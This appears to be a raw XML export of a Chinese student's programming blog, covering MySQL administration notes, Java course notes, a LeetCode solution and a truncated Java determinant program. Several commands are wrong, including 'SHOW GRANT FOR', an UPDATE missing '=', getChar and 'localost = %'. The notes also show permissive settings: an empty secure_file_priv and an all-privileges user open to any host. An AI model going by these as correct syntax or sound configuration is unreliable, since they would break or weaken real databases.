class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line"></span><br><span class="line"># The TCP/IP Port the MySQL Server will listen on</span><br><span class="line">port=3306</span><br><span class="line"></span><br><span class="line">secure_file_priv = &apos;&apos;</span><br></pre></td></tr></table></figure><p>导出csv</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> customertable</span><br><span class="line"><span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'F:\\Code\\mysql\\a.csv'</span></span><br><span class="line"><span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">','</span> <span class="keyword">optionally</span> <span class="keyword">enclosed</span> <span class="keyword">by</span> <span class="string">'"'</span></span><br><span class="line"><span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\r\n'</span>;</span><br></pre></td></tr></table></figure><p>导出图片</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> [<span class="keyword">select</span> options] <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">`&lt;filename&gt;`</span>;</span><br><span class="line"><span class="keyword">select</span> img <span class="keyword">from</span> commoditytable <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'qiezibao'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'F:\\Code\\mysql\\a.jpg'</span>;</span><br></pre></td></tr></table></figure><h3 id="导入数据"><a href="#导入数据" class="headerlink" title="导入数据"></a>导入数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span> <span class="keyword">INFILE</span> <span class="string">`&lt;filename&gt;`</span> <span class="keyword">into</span> <span class="keyword">table</span> &lt;tablename&gt; [&lt;import_option&gt;] [<span class="keyword">IGNORE</span> &lt;<span class="built_in">number</span>&gt; <span class="keyword">LINES</span>] [(&lt;<span class="keyword">column</span> <span class="keyword">name</span>&gt;[&#123;, &lt;<span class="keyword">column</span> <span class="keyword">name</span>&gt;&#125;...])]</span><br><span class="line"></span><br><span class="line">&lt;import_option&gt;::=</span><br><span class="line">&#123; <span class="keyword">FIELDS</span> | <span class="keyword">COLUMNS</span></span><br><span class="line">[<span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">`&lt;value&gt;`</span>]  <span class="comment"># 列结束</span></span><br><span class="line">[[<span class="keyword">OPTIONALLY</span>] <span class="keyword">ENCLOSED</span> <span class="keyword">BY</span> <span class="string">`&lt;value&gt;`</span>]   <span class="comment"># 开始和结束</span></span><br><span class="line">[<span class="keyword">ESCAPED</span> <span class="keyword">BY</span> <span class="string">`&lt;value&gt;`</span>] &#125;  </span><br><span class="line">| &#123; <span class="keyword">LINES</span></span><br><span class="line">[<span class="keyword">STARTING</span> <span class="keyword">BY</span> <span class="string">`&lt;value&gt;`</span>]     <span class="comment"># 行起始</span></span><br><span class="line"><span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">`&lt;value&gt;`</span>] &#125;  <span class="comment"># 行结束</span></span><br></pre></td></tr></table></figure><p>导入csv</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">'F:\\Code\\mysql\\a.csv'</span> <span class="keyword">into</span> <span class="keyword">table</span> customertable</span><br><span class="line"><span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">','</span> <span class="keyword">optionally</span> <span class="keyword">enclosed</span> <span class="keyword">by</span> <span class="string">'"'</span></span><br><span class="line"><span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\r\n'</span>;</span><br></pre></td></tr></table></figure><h2 id="Administering-MySQL-Databases"><a href="#Administering-MySQL-Databases" class="headerlink" title="Administering MySQL Databases"></a>Administering MySQL Databases</h2><h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><h4 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h4><p>用sql语句有两种方法<br>一种create new user<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">'joe'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'password_joe'</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">'joe'</span>@<span class="string">'localhost'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'password_joe'</span>;</span><br></pre></td></tr></table></figure></p><p>一种insert into mysql.user<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mysql.user <span class="keyword">values</span>(<span class="string">'%'</span>, <span class="string">'beiyu'</span>, <span class="keyword">PASSWORD</span>(<span class="string">'beiyu'</span>), <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">'Y'</span>, <span class="string">''</span>, <span class="string">''</span>, <span class="string">''</span>, <span class="string">''</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">''</span>, <span class="string">''</span>);</span><br></pre></td></tr></table></figure></p><p>用<code>flush privileges;</code>刷新权限</p><p>hosts: localost = %</p><h4 id="修改用户名"><a href="#修改用户名" class="headerlink" title="修改用户名"></a>修改用户名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">rename</span> <span class="keyword">user</span> &lt;old_user_name&gt; <span class="keyword">to</span> &lt;new_user_name&gt;;</span><br></pre></td></tr></table></figure><h4 id="修改用户密码"><a href="#修改用户密码" class="headerlink" title="修改用户密码"></a>修改用户密码</h4><p>两种方式，set password 和 update</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">password</span>=<span class="keyword">password</span>(<span class="string">'1234'</span>); <span class="comment"># 修改当前账户密码</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">password</span> <span class="keyword">for</span> &lt;account_name&gt; = &#123;</span><br><span class="line">    <span class="keyword">password</span>(<span class="string">'password_1234'</span>) | <span class="string">'encrypted_password'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> mysql.user <span class="keyword">set</span> <span class="keyword">password</span>=<span class="keyword">password</span>(<span class="string">'1234'</span>) <span class="keyword">where</span> <span class="keyword">user</span>  <span class="string">'beiyu'</span>;</span><br></pre></td></tr></table></figure><h4 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h4><p>两种方式，drop user 和 delete<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> account_name;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'beiyu'</span>;</span><br></pre></td></tr></table></figure></p><h3 id="用户权限管理"><a href="#用户权限管理" class="headerlink" title="用户权限管理"></a>用户权限管理</h3><h4 id="给予权限"><a href="#给予权限" class="headerlink" title="给予权限"></a>给予权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> &lt;privilege_type&gt; [(&lt;col_name&gt; [, &lt;col_name&gt;...])] [, &lt;privilege_type&gt; [(&lt;col_name&gt; [, &lt;col_name&gt;...])] ...]</span><br><span class="line">    <span class="keyword">on</span> privilege_level </span><br><span class="line">    <span class="keyword">to</span> account_name [<span class="keyword">identified</span> <span class="keyword">by</span> [<span class="keyword">password</span>] <span class="string">'password'</span>]</span><br><span class="line">    [, account_name [<span class="keyword">identified</span> <span class="keyword">by</span> [<span class="keyword">password</span>] <span class="string">'password'</span>]...]</span><br></pre></td></tr></table></figure><p>privilege_type: </p><ul><li><code>all</code></li><li><code>alter</code></li><li><code>create</code></li><li><code>create routine</code></li><li><code>create user</code></li><li><code>create view</code></li><li><code>delete</code></li><li><code>drop</code></li><li><code>select</code></li><li><code>update</code></li></ul><p>privilege_level:</p><ul><li><code>*.*</code></li><li><code>*</code></li><li><code>database_name.*</code></li><li><code>table_name</code></li></ul><h4 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GRANT</span> <span class="keyword">FOR</span> account_name</span><br></pre></td></tr></table></figure><h4 id="撤销权限"><a href="#撤销权限" class="headerlink" title="撤销权限"></a>撤销权限</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">REVOKE</span> &lt;privilege_type&gt; [(&lt;column_name&gt;) [, &lt;column_name&gt;...]]</span><br><span class="line">[,&#123;&lt;privilege_type&gt; [(&lt;column_name&gt;) [, &lt;column_name&gt;...]]&#125;...]</span><br><span class="line"><span class="keyword">ON</span> privilege_level</span><br><span class="line"><span class="keyword">FROM</span> account_name [IDENTIFED <span class="keyword">BY</span> [<span class="keyword">PASSWORD</span>] <span class="string">`&lt;password&gt;`</span>]</span><br><span class="line">[,account_name [IDENTIFED <span class="keyword">BY</span> [<span class="keyword">PASSWORD</span>] <span class="string">`&lt;password&gt;`</span>] ...]</span><br></pre></td></tr></table></figure><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><h3 id="Back-up"><a href="#Back-up" class="headerlink" title="Back up"></a>Back up</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysqld --log-bin [=&lt;base_name&gt;]</span><br><span class="line">mysqldump [--flush-logs] -u &lt;user_name&gt; -p &lt;database_name&gt;</span><br><span class="line">mysqldump [--flush-logs] -u &lt;user_name&gt; -p &lt;database_name&gt; &gt; &lt;path_and_filename&gt;</span><br><span class="line">mysqldump [--flush-logs] -u &lt;user_name&gt; -p &lt;database_name&gt; [&lt;table_name&gt;, [&lt;table_name&gt;]...] &gt; &lt;path_and_filename&gt;</span><br><span class="line">mysqldump [--flush-logs] -u &lt;user_name&gt; -p --database &lt;database_name&gt; [&lt;database_name&gt;...] &gt; &lt;path_and_filename&gt;</span><br><span class="line">mysqldump --all-databases &gt; &lt;path_and_filename&gt;</span><br></pre></td></tr></table></figure><h3 id="Recover"><a href="#Recover" class="headerlink" title="Recover"></a>Recover</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u &lt;user_name&gt; -p [&lt;database_name&gt;] &lt; &lt;path_and_filename&gt;</span><br></pre></td></tr></table></figure><h3 id="Updating-the-Reloaded-Databases-Using-Binary-Logs"><a href="#Updating-the-Reloaded-Databases-Using-Binary-Logs" class="headerlink" title="Updating the Reloaded Databases Using Binary Logs"></a>Updating the Reloaded Databases Using Binary Logs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqlbinlog &quot;&lt;Path&gt;\&lt;binary_log_file&gt;&quot; | mysql -u &lt;user_name&gt; -p</span><br></pre></td></tr></table></figure><p>Using Text File with Exported Binary Log Data<br>```<br>mysqlbinlog “<path>\<binary_log_file>“ &gt; “<path>\<text_file>“</text_file></path></binary_log_file></path></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.techonthenet.com/mysql/index.php" target="_blank" rel="noopener">https://www.techonthenet.com/mysql/index.php</a></li><li><a href="https://www.w3schools.com/sql/default.asp" target="_blank" rel="noopener">https://www.w3schools.com/sql/default.asp</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java笔记</title>
      <link href="/blog/note-java/"/>
      <url>/blog/note-java/</url>
      
        <content type="html"><![CDATA[<p>阿伟整理不完了…要考试了</p><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h3 id="java-company"><a href="#java-company" class="headerlink" title="java company"></a>java company</h3><p>Sun Microsystem, Inc.</p><h3 id="java文件"><a href="#java文件" class="headerlink" title="java文件"></a>java文件</h3><p>每个java文件只能有一个public类，文件名与public类名相同。</p><h3 id="编译与运行"><a href="#编译与运行" class="headerlink" title="编译与运行"></a>编译与运行</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac helloworld.java</span><br><span class="line">java hellojava</span><br></pre></td></tr></table></figure><p>打包编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d 目标路径 文件路径</span><br></pre></td></tr></table></figure></p><p>设置环境变量/set path=/path=</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><table border="1" cellspacing="0"><caption>Java数据类型</caption><thead><tr><th>Group</th><th>DataType</th><th>Size</th><th>Range</th><th>DefaultValue</th></tr></thead><tbody><tr>    <th rowspan="4">Integer</th>    <th>byte</th>    <th>1 byte</th>    <th> $-2^7~2^7-1$ </th>    <th>0</th></tr><tr>    <th>short</th>    <th>2 bytes</th>    <th> $-2^15~2^15-1$ </th>    <th>0</th></tr><tr>    <th>int</th>    <th>4 bytes</th>    <th> $-2^31~2^31-1$ </th>    <th>0</th></tr><tr>    <th>long</th>    <th>8 bytes</th>    <th> $-2^63~2^63-1$ </th>    <th>0</th></tr><tr>    <th rowspan="2"> floating point</th>    <th>float</th>    <th>4 bytes</th>    <th>3.4^{e-038}~3.4^{e+038}</th>    <th>0.0</th></tr><tr>    <th>double</th>    <th>8 bytes</th>    <th>1.7^{e-308}~1.7^{e+308}</th>    <th>0.0</th></tr></tbody></table><p>字符型<br>char<br>字符串<br>String是一个类</p><p>布尔型<br>boolean</p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>基本跟c一样<br>特殊的无符号右移&gt;&gt;&gt;<br>判断类型是否相等instanceof</p><h3 id="访问控制修饰符"><a href="#访问控制修饰符" class="headerlink" title="访问控制修饰符"></a>访问控制修饰符</h3><p>Java中，可以使用访问控制符来保护对类、变量、方法和构造方法的访问。Java 支持 4 种不同的访问权限。<br>default (即缺省，什么也不写）: 在同一包内可见，不使用任何修饰符。使用对象：类、接口、变量、方法。<br>private : 在同一类内可见。使用对象：变量、方法。 注意：不能修饰类（外部类）<br>public : 对所有类可见。使用对象：类、接口、变量、方法<br>protected : 对同一包内的类和所有子类可见。使用对象：变量、方法。 注意：不能修饰类（外部类）。<br>final 修饰符<br>final 变量：<br>final 表示”最后的、最终的”含义，变量一旦赋值后，不能被重新赋值。被 final 修饰的实例变量必须显式指定初始值。<br>final 修饰符通常和 static 修饰符一起使用来创建类常量。</p><h3 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h3><p>Scanner<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line">Scanner sn = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"><span class="keyword">int</span> a = sn.nextInt();</span><br><span class="line">String b = sn.next();</span><br><span class="line">String c = sn.nextLine();</span><br><span class="line"><span class="keyword">char</span> d = sn.next().charAt(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">double</span> f = sn.nextDouble();</span><br></pre></td></tr></table></figure></p><p>System.out<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(); <span class="comment">// 输出并换行</span></span><br><span class="line">System.out.print(); <span class="comment">// 输出不换行</span></span><br><span class="line">System.out.printf(); <span class="comment">// 格式化输出</span></span><br></pre></td></tr></table></figure></p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">arraytype arrayname[] = <span class="keyword">new</span> arraytype[size];</span><br><span class="line">arraytype[] arrayname = <span class="keyword">new</span> arraytype[size];</span><br><span class="line"></span><br><span class="line">arraytype arrayname[][] = <span class="keyword">new</span> arraytype[sizex][sizey];</span><br></pre></td></tr></table></figure><h3 id="String-StringBuffer-StringBuilder"><a href="#String-StringBuffer-StringBuilder" class="headerlink" title="String/StringBuffer/StringBuilder"></a>String/StringBuffer/StringBuilder</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String a = <span class="string">"Hello"</span> </span><br><span class="line">String a = <span class="keyword">new</span> String(<span class="string">"Hello"</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">charAt(<span class="number">0</span>); <span class="comment">// 返回第一个字符</span></span><br><span class="line">length(); <span class="comment">// 长度</span></span><br><span class="line">getChar(<span class="keyword">int</span> srcBegin, <span class="keyword">int</span> srcEnd, <span class="keyword">char</span>[] dst, <span class="keyword">int</span> dstBegin); <span class="comment">// 将src开始到结束左闭右开区间的字符串copy到dstBegin开始的字符串中</span></span><br><span class="line">equals(); <span class="comment">// 判断是否相等，最好用字符常量与变量判断，防止空字符串。</span></span><br><span class="line">compareTo(); <span class="comment">// 字符串比较</span></span><br><span class="line">startsWith(); <span class="comment">// 是否以指定字符串为开头</span></span><br><span class="line">endsWith(); <span class="comment">// 是否以指定字符串为结尾</span></span><br><span class="line">indexOf(); <span class="comment">// 返回第一次字符出现的位置，若不存在返回-1</span></span><br><span class="line">lastIndexOf(); <span class="comment">// 返回最后一次字符出现的位置，若不存在返回-1</span></span><br><span class="line">subString(<span class="keyword">int</span> beginindex); <span class="comment">// 返回从index开始的，到字符串末尾的子串。</span></span><br><span class="line">concat(String str); <span class="comment">// 连接字符串</span></span><br><span class="line">replace(<span class="keyword">char</span> oldChar, <span class="keyword">char</span> newChar); <span class="comment">// 字符替换，将oldChar替换成newChar</span></span><br><span class="line">toUpperCase(); <span class="comment">// 大写</span></span><br><span class="line">toLowerCase(); <span class="comment">// 小写</span></span><br><span class="line">trim(); <span class="comment">// 去掉两段的空格</span></span><br><span class="line">toCharArray(); <span class="comment">// 转换成char数组返回</span></span><br><span class="line">valueOf(); <span class="comment">// 转换成字符串</span></span><br><span class="line">equalsIgnoreCase(); <span class="comment">// 大小写不敏感比较字符串</span></span><br></pre></td></tr></table></figure><p>StringBuffer 和 StringBuilder不建立新的字符串对象，但可以使用append(), delete(), insert(), reverse() 函数</p><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h2 id="继承和多态"><a href="#继承和多态" class="headerlink" title="继承和多态"></a>继承和多态</h2><h3 id="Inheritance"><a href="#Inheritance" class="headerlink" title="Inheritance"></a>Inheritance</h3><p>You can reuse or extend the functionalities and capabilities of an existing class in a new class if both the classes have similarities amongst themselves. A class inherit the features of a related class and add new features, as per the requirement.</p><ul><li>Single level inheritance(单级继承)</li><li>Multilevel inheritance(多级继承)</li><li>Hierarchical inheritance(分层继承)<br>Java doesnot support Multiple inheritance, using interface can do it.</li></ul><h3 id="Polymorphism"><a href="#Polymorphism" class="headerlink" title="Polymorphism"></a>Polymorphism</h3><p>Polymorphism is an OOP feature that enables an entity to exist in multiple forms. In Java, polymorphism has the following two types.</p><ul><li>Static polymorphism</li><li>Dynamic polymorphism</li></ul><p>The method signature comprises a method’s name and parameter list.</p><h2 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h2><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><h3 id="Work-with-Threads"><a href="#Work-with-Threads" class="headerlink" title="Work with Threads"></a>Work with Threads</h3><p>Further, you can implement multithreading in an application to achieve an efficient performance and utilize the CPU processing capabilities.</p><p>Advantages of multithreading</p><ul><li>Improved performance</li><li>Minimized system resource usage</li><li>Program structure simplification</li></ul><p>Disadvantages</p><ul><li>Race condition</li><li>Deadlock condition</li><li>Lock starvation</li></ul>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>出土训练1</title>
      <link href="/blog/problem-ctxl1/"/>
      <url>/blog/problem-ctxl1/</url>
      
        <content type="html"><![CDATA[<ol><li>只出现一次的数字</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> t=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.size();i++) t^=nums[i];</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> problem </category>
          
      </categories>
      
      
        <tags>
            
            <tag> problem </tag>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>行列式</title>
      <link href="/blog/java-HangLieShi/"/>
      <url>/blog/java-HangLieShi/</url>
      
        <content type="html"><![CDATA[<p>UPD20190318<br>我发现写错了…交换行的时候没写变号…</p><p>----------------</p><p>上课闲着没事…用Java写了个求行列式的<br>还是高斯消元那样求</p><p>我的命名还是一如既往的风骚233</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// QAQ.java</span></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QAQ</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span> eps = <span class="number">1e-6</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">double</span>[][] a = <span class="keyword">new</span> <span class="keyword">double</span>[<span class="number">55</span>][<span class="number">55</span>];</span><br><span class="line">    </span><br><span class="line"><span class="comment">//private double abs(double a) &#123; return a&gt;0?a:-a; &#125;</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">cmp</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Math.abs(a-b)&lt;eps;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Scanner sn = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        n = sn.nextInt();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>; j&lt;=n; j++) &#123;</span><br><span class="line">                a[i][j] = sn.nextDouble();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">Solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> ans = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(cmp(a[i][i],<span class="number">0</span>)) &#123;</span><br><span class="line">                ans = -ans;</span><br><span class="line">                <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>; j&lt;=n; j++) <span class="keyword">if</span>(!cmp(a[j][i],<span class="number">0</span>)) flag = j;</span><br><span class="line">                <span class="keyword">if</span>(flag==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=i; j&lt;=n; j++) &#123;</span><br><span class="line">                    <span class="keyword">double</span> t=a[i][j];</span><br><span class="line">                    a[i][j]=a[flag][j];</span><br><span class="line">                    a[flag][j]=t;</span><br><span class="line">                    <span class="comment">// swap(a[i][j], a[flag][j]);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>; j&lt;=n; j++) &#123;</span><br><span class="line">                <span class="comment">// if(cmp(a[j][i],0)) continue;</span></span><br><span class="line">                <span class="keyword">double</span> t=a[j][i]/a[i][i];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=i; 